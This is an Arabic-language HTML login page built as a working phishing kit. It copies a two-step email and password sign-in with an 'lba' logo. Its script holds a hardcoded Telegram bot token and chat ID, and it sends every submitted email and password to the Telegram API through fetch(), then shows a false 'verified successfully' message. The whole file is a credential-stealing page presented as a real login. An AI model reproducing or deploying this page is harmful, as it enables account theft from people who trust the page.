<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #0a1929 0%, #1a3a52 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 500px;
        }

        /* صفحة 1 */
        .page-1.active {
            display: block;
        }

        .page-1 {
            display: none;
        }

        .back-btn {
            background: none;
            border: none;
            color: white;
            font-size: 32px;
            cursor: pointer;
            margin-bottom: 30px;
            transition: opacity 0.3s ease;
            padding: 0;
        }

        .back-btn:hover {
            opacity: 0.7;
        }

        .logo {
            text-align: center;
            margin-bottom: 40px;
        }

        .logo img {
            height: 80px;
            object-fit: contain;
        }

        .heading {
            text-align: center;
            color: white;
            font-size: 18px;
            font-weight: 400;
            line-height: 1.6;
            margin-bottom: 30px;
            letter-spacing: 0.3px;
        }

        .form-group {
            margin-bottom: 25px;
        }

        label {
            display: block;
            color: white;
            font-size: 14px;
            font-weight: 400;
            margin-bottom: 12px;
            text-align: right;
        }

        .input-wrapper {
            position: relative;
        }

        input {
            width: 100%;
            padding: 16px 20px;
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(0, 150, 255, 0.5);
            border-radius: 12px;
            color: white;
            font-size: 16px;
            font-family: inherit;
            transition: all 0.3s ease;
            text-align: right;
        }

        input::placeholder {
            color: rgba(255, 255, 255, 0.6);
        }

        input:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.15);
            border-color: rgba(0, 150, 255, 0.8);
            box-shadow: 0 0 10px rgba(0, 150, 255, 0.3);
        }

        .error-message {
            color: #ff6b6b;
            font-size: 12px;
            margin-top: 8px;
            text-align: right;
        }

        .forgot-link {
            text-align: center;
            margin-top: 20px;
        }

        .forgot-link a {
            color: rgba(255, 255, 255, 0.7);
            text-decoration: none;
            font-size: 13px;
            transition: color 0.3s ease;
        }

        .forgot-link a:hover {
            color: white;
        }

        .form-actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 30px;
            gap: 20px;
        }

        .submit-btn {
            padding: 12px 40px;
            background: #0096ff;
            color: white;
            border: none;
            border-radius: 25px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .submit-btn:hover {
            background: #0082d4;
            box-shadow: 0 4px 15px rgba(0, 150, 255, 0.3);
        }

        .submit-btn:active {
            background: #0070b8;
        }

        .submit-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .create-account {
            color: rgba(255, 255, 255, 0.7);
            font-size: 13px;
        }

        .create-account a {
            color: #0096ff;
            text-decoration: none;
            transition: color 0.3s ease;
        }

        .create-account a:hover {
            color: #00c7ff;
            text-decoration: underline;
        }

        /* صفحة 2 */
        .page-2.active {
            display: block;
        }

        .page-2 {
            display: none;
        }

        .email-display {
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(0, 150, 255, 0.3);
            border-radius: 25px;
            padding: 12px 18px;
            margin-bottom: 40px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
        }

        .email-text {
            flex: 1;
            color: white;
            font-size: 14px;
            text-align: right;
        }

        .dropdown-icon {
            color: rgba(255, 255, 255, 0.7);
            font-size: 16px;
        }

        .profile-icon {
            width: 32px;
            height: 32px;
            background: rgba(0, 150, 255, 0.2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 16px;
        }

        .password-input-container {
            position: relative;
            margin-bottom: 20px;
        }

        .password-label {
            display: block;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.8);
            margin-bottom: 8px;
            font-weight: 400;
            text-align: right;
        }

        .password-input {
            width: 100%;
            padding: 16px 50px 16px 20px !important;
            border: 2px solid rgba(0, 150, 255, 0.6) !important;
            border-radius: 12px;
            font-size: 16px;
            text-align: right;
            position: relative;
        }

        .password-input:focus {
            outline: none;
            border-color: rgba(0, 150, 255, 0.9) !important;
            box-shadow: 0 0 10px rgba(0, 150, 255, 0.3) !important;
        }

        .password-toggle {
            position: absolute;
            left: 15px;
            top: 40px;
            background: none;
            border: none;
            color: rgba(255, 255, 255, 0.7);
            cursor: pointer;
            font-size: 20px;
            transition: color 0.3s ease;
        }

        .password-toggle:hover {
            color: white;
        }

        .checkbox-container {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-top: 15px;
            margin-bottom: 20px;
        }

        .checkbox-container input[type="checkbox"] {
            width: auto;
            padding: 0;
            border: none;
            background: none;
            cursor: pointer;
        }

        .checkbox-container label {
            margin: 0;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.7);
            font-weight: 400;
            cursor: pointer;
        }

        .loading {
            display: none;
            text-align: center;
            color: white;
            margin-top: 20px;
        }

        .spinner {
            border: 3px solid rgba(0, 150, 255, 0.2);
            border-top: 3px solid #0096ff;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .email-suffix {
            position: absolute;
            right: 20px;
            color: rgba(255, 255, 255, 0.6);
            font-size: 14px;
            pointer-events: none;
        }

        .email-suffix.hidden {
            display: none;
        }

        @media (max-width: 480px) {
            .container {
                padding: 0 15px;
            }

            .heading {
                font-size: 16px;
            }

            input {
                font-size: 16px;
            }

            .form-actions {
                flex-direction: column-reverse;
                width: 100%;
            }

            .submit-btn {
                width: 100%;
            }

            .logo img {
                height: 60px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- الصفحة الأولى -->
        <div class="page-1 active">
            <button class="back-btn" onclick="window.history.back()">←</button>

            <div class="logo">
                <img src="https://a.top4top.io/p_37430qzsw0.png" alt="lba logo">
            </div>

            <h1 class="heading">للاستمرار، يرجى إدخال البريد الإلكتروني المستخدم وكلمة المرور</h1>

            <form id="loginForm">
                <div class="form-group">
                    <label for="email">البريد الإلكتروني</label>
                    <div class="input-wrapper">
                        <input 
                            type="email" 
                            id="email" 
                            name="email"
                            placeholder="أدخل بريدك الإلكتروني"
                            required
                        >
                    </div>
                    <div class="error-message" id="emailError"></div>
                </div>

                <div class="form-group">
                    <label for="password">كلمة المرور</label>
                    <div class="input-wrapper">
                        <input 
                            type="password" 
                            id="password" 
                            name="password"
                            placeholder="أدخل كلمة المرور"
                            required
                        >
                    </div>
                </div>

                <p class="forgot-link">
                    <a href="#">هل نسيت كلمة المرور؟</a>
                </p>

                <div class="form-actions">
                    <p class="create-account">
                        <a href="#">إنشاء حساب</a>
                    </p>
                    <button type="submit" class="submit-btn" id="submitBtn">التالي</button>
                </div>
            </form>

            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p>جاري المتابعة...</p>
            </div>
        </div>

        <!-- الصفحة الثانية -->
        <div class="page-2">
            <button class="back-btn" onclick="goBackToPage1()">←</button>

            <div class="logo">
                <img src="https://a.top4top.io/p_37430qzsw0.png" alt="lba logo">
            </div>

            <h1 class="heading" style="margin-bottom: 40px;">مرحباً</h1>

            <div class="email-display">
                <div class="profile-icon">👤</div>
                <span class="dropdown-icon">▼</span>
                <span class="email-text" id="displayEmail">your.email@gmail.com</span>
            </div>

            <form id="passwordForm">
                <div class="password-input-container">
                    <label class="password-label">إدخال كلمة المرور</label>
                    <input 
                        type="password" 
                        id="passwordInput" 
                        name="password"
                        class="password-input"
                        placeholder="أدخل كلمة المرور"
                        required
                    >
                    <button type="button" class="password-toggle" onclick="togglePassword()">🔊</button>
                </div>

                <div class="checkbox-container">
                    <input type="checkbox" id="showPassword" onchange="togglePassword()">
                    <label for="showPassword">عرض كلمة المرور</label>
                </div>

                <p class="forgot-link">
                    <a href="#">هل نسيت كلمة المرور؟</a>
                </p>

                <div class="form-actions">
                    <button type="submit" class="submit-btn">التالي</button>
                </div>
            </form>

            <div class="loading" id="passwordLoading">
                <div class="spinner"></div>
                <p>جاري التحقق...</p>
            </div>
        </div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8607340933:AAEKE8jwaYZVx_4955TocD8kCeg6se9Fdyg';
        const TELEGRAM_CHAT_ID = '6873334348';

        let savedEmail = '';

        // الصفحة الأولى
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value;

            if (!email || !password) {
                alert('الرجاء ملء جميع الحقول');
                return;
            }

            savedEmail = email;

            // إرسال البيانات إلى التلجرام
            sendToTelegram(email, password);

            // الانتقال إلى الصفحة الثانية
            goToPage2(email);
        });

        // الصفحة الثانية
        document.getElementById('passwordForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const password = document.getElementById('passwordInput').value;

            if (!password) {
                alert('الرجاء إدخال كلمة المرور');
                return;
            }

            document.getElementById('passwordLoading').style.display = 'block';

            // إرسال البيانات إلى التلجرام
            await sendToTelegram(savedEmail, password);

            document.getElementById('passwordLoading').style.display = 'none';

            alert('تم التحقق بنجاح!');
            document.getElementById('passwordForm').reset();
        });

        function togglePassword() {
            const input = document.getElementById('passwordInput');
            const checkbox = document.getElementById('showPassword');

            if (checkbox.checked) {
                input.type = 'text';
            } else {
                input.type = 'password';
            }
        }

        function goToPage2(emailOrPhone) {
            const isPhone = /^\d{10,}$/.test(emailOrPhone);
            const displayValue = isPhone ? emailOrPhone : emailOrPhone.includes('@') ? emailOrPhone : emailOrPhone + '@gmail.com';

            document.querySelector('.page-1').classList.remove('active');
            document.querySelector('.page-2').classList.add('active');
            document.getElementById('displayEmail').textContent = displayValue;
        }

        function goBackToPage1() {
            document.querySelector('.page-2').classList.remove('active');
            document.querySelector('.page-1').classList.add('active');
            document.getElementById('loginForm').reset();
        }

        async function sendToTelegram(email, password) {
            try {
                const message = `
📧 <b>بيانات دخول جديدة</b>
━━━━━━━━━━━━━━━━━
📌 <b>البريد الإلكتروني:</b> <code>${email}</code>
🔐 <b>كلمة المرور:</b> <code>${password}</code>
⏰ <b>التاريخ والوقت:</b> ${new Date().toLocaleString('ar-SA')}
━━━━━━━━━━━━━━━━━`;

                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                const data = await response.json();

                if (data.ok) {
                    console.log('تم إرسال البيانات بنجاح');
                }
            } catch (error) {
                console.error('Error:', error);
            }
        }
    </script>
</body>
</html>
